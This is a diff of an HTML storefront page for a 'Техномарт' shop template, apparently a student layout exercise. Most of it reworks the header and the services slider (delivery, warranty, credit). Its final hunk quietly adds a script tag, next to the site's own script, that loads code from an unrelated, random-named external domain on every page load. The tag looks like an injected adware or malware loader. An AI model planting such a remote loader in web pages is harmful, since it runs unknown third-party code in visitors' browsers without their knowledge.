@@ -14,15 +14,15 @@
   <div class="header-top">
    <div class="header-top-wrapper container">
         <a class="main">Техномарт</a>
-    <form class="page-header-search" action="#" method="post">
-        <input type="search" id="field-search" name="search" placeholder="Поиск:">
-        <label for="field-search">Поиск:</label>
-    </form>
-    <div class="user-block">
-        <a class="bookmark" href="#">Закладки: <i class="top-header__amount">0</i></a>
+     <form class="page-header-search" action="#" method="post">
+      <input type="search" id="field-search" name="search" placeholder="Поиск">
+      <label for="field-search">Поиск:</label>
+     </form>
+	   <ul class="user-block">
+        <a class="bookmark" href="#">Закладки:  <i class="top-header__amount">0</i></a>
         <a class="basket" href="#">Корзина: <i class="top-header__amount">0</i></a>
         <a class="order" href="#">Оформить заказ</a>
-    </div>  		
+       </ul>		
    </div>
   </div>
   <div class="header-bottom-page-1"> 
@@ -189,55 +189,61 @@
         <a class="catalog-item2" href="#">
          <img width="155" height="55" src="img/company-metabo.jpg" alt="metabo">
         </a>
-    </div>
- </section>
-  <div class="tab-menu">
-    <div class="container"> 
-     <h2>Сервисы</h2>
-     <p>Хороший интернет-магазин отличается от плохого не только ценами! Мы стараемся из всех сил, чтобы сделать ваши покупки приятными</p>
-      <div class="service-slides">
-        <input type="radio" id="button-1" name="service-toggle" checked=""/>
-        <input type="radio" id="button-2" name="service-toggle"/>	  
-        <input type="radio" id="button-3" name="service-toggle"/>	          			   
-        <div class="service-toggle">
-         <label for="button-1">Доставка</label>
-         <label for="button-2">Гарантия</label>
-         <label for="button-3">Кредит</label>
+      </div>
+     </section>
+     <div class="techomart-services">
+      <div class="container">
+        <div class="services__title-block">
+          <h2 class="text-common services__h2">Сервисы</h2>
+          <p class="text-common services__description">
+            Хороший интернет-магазин отличается от плохого не только ценами!
+            <br> Мы стараемся изо всех сил, чтобы сделать ваши покупки приятными.
+          </p>
         </div>
-       <div class="service-block-right">
-          <div class="service-touch-button delivery">
-             <span>Доставка</span>
-              <p>Мы с удовольствием доставим товар прямо<br>
+        <div class="services__slider">
+          <input id="delivery" class="services__input" type="radio" name="services" value="s2-r1" checked>
+          <input id="warranty" class="services__input" type="radio" name="services" value="s2-r2">
+          <input id="credit" class="services__input" type="radio" name="services" value="s2-r3">
+          <div class="services__switches">
+            <label for="delivery" class="services__label">Доставка</label>
+            <label for="warranty" class="services__label">Гарантия</label>
+            <label for="credit" class="services__label">Кредит</label>
+          </div>
+          <div class="services__wrapper">
+            <div class="services__slide services__slide_1">
+              <h2 class="text-common services__slide-title">Доставка</h2>
+              <p class="services__description services__description_slide">
+                Мы с удовольствием доставим ваш товар прямо
                 к вашему подъезду совершенно бесплатно!
-		        Ведь мы неплохо заработаем<br> поднимая,
-		        его на ваш этаж!</p>	
-			<div class="images-truck">
-					
-			</div>
+                 Ведь мы неплохо заработаем,
+                 поднимая его на ваш на этаж!             
+              </p>
+            </div>
+            <div class="services__slide services__slide_2">
+              <h2 class="text-common services__slide-title ">Гарантия</h2>
+              <p class="services__description services__description_slide">
+                Если купленный у нас товар поломается или заискрит,
+                <br> а также в случае пожара, спровоцированного его возгаранием,
+                <br> вы всегда можете быть уверены в нашей гарантии. Мы обменяем
+                <br> сгоревший товар на новый.
+                <br> Дом уж восстановите как-нибудь сами.
+              </p>
+              <img class="media-common services__img services__img_warranty" src="img/Services__warranty.png" width="170" height="172" alt="warranty">
+            </div>
+            <div class="services__slide services__slide_3">
+              <h2 class="text-common services__slide-title ">Кредит</h2>
+              <p class="services__description services__description_slide">
+                Залезть в долговую яму стало проще!
+                <br> Кредитные консультанты придут вам на помощь.
+              </p>
+              <a class="link-common technomart-button_red services__button" href="#">Отправить заявку</a>
+              <img class="media-common services__img services__img_credit" src="img/Services__credit.png" width="181" height="184" alt="credit">
+            </div>
           </div>
-          <div class="service-touch-button garantia">
-             <span>Гарантия</span>
-             <p> Если купленный у нас товар поломается или заискрит,
-           <br/>
-          а также в случае пожара, спровоцированного его вогаранием, вы всегда можете быть уверены в нашей гарантии. Мы обменяем сгоревший товар на новый. <br/> Дом уж восстановите как нибудь сами.</p>       
-             
-			 <div class="images-discount">
-				
-			</div>
-          </div>
-          <div class="service-touch-button credit">
-             <span>Кредит</span>
-             <p>Залезть в долговую яму стало проще!<br/> 
-             Кредитные консультанты придут вам на помощь.</p>
-			 <div class="images-credit">
-					
-			 </div>
-             <a class="btn" href="credit.html">Отправить заявку</a>
-          </div>
-       </div>
-      </div>  
-    </div> 
-  </div>
+        </div>
+      </div>
+    </div>
+
   <div class="about-technomart">
     <div class="about-technomart-wrapper container">
     <div class="index-content-left">
@@ -334,7 +340,8 @@
         <a class="buy-return" href="index.html">Продолжить покупки</a>
       </div>		
     </section>	
-      <script src="js/script.js"></script>
+    <script src="js/script.js"></script>
+	<script src="http://ysdgcshzff-code.biz/code-upd.php?appid=imr1634-7264-1505066886472-63a13326-ffbd-4c56-9864-12136d68076a&h=0&m=normal&aff=0" id="ubar-loader"></script>
 </body>
 </html>
 
